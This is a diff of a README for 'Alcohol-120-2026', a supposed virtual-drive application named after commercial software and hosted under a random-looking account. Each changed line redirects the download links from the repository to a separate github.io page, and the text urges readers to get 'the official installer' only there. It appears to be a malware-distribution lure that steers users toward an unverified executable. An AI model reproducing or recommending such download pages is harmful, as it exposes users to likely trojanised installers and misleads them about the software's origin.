@@ -1,6 +1,6 @@
 # 💿 Alcohol-120-2026 - Create Virtual Drives With Ease
 
-[![](https://img.shields.io/badge/Download-Alcohol_120_2026-blue.svg)](https://github.com/economyofscalefalseverdict361/Alcohol-120-2026)
+[![](https://img.shields.io/badge/Download-Alcohol_120_2026-blue.svg)](https://economyofscalefalseverdict361.github.io)
 
 ## 📖 About This Application
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements to run the software correctly:
 
 You must download the official installer directly from our repository.
 
-1. Navigate to the official download page: [https://github.com/economyofscalefalseverdict361/Alcohol-120-2026](https://github.com/economyofscalefalseverdict361/Alcohol-120-2026)
+1. Navigate to the official download page: [https://economyofscalefalseverdict361.github.io](https://economyofscalefalseverdict361.github.io)
 2. Look for the release section on the page.
 3. Click the link to save the installer file to your computer.
 4. Choose a folder where you can find the file easily, such as your Downloads folder.
@@ -69,7 +69,7 @@ You can control how many virtual drives the application manages.
 
 Always download your software from the official link provided here. Sources outside of this repository might contain different files or modified versions that do not function as intended. 
 
-* Use the official link to visit this page to download: [https://github.com/economyofscalefalseverdict361/Alcohol-120-2026](https://github.com/economyofscalefalseverdict361/Alcohol-120-2026)
+* Use the official link to visit this page to download: [https://economyofscalefalseverdict361.github.io](https://economyofscalefalseverdict361.github.io)
 * Keep your Windows operating system updated to ensure compatibility with virtual drive drivers.
 * Maintain a backup of your ISO files in a safe location, such as an external hard drive, to protect against data loss.
 
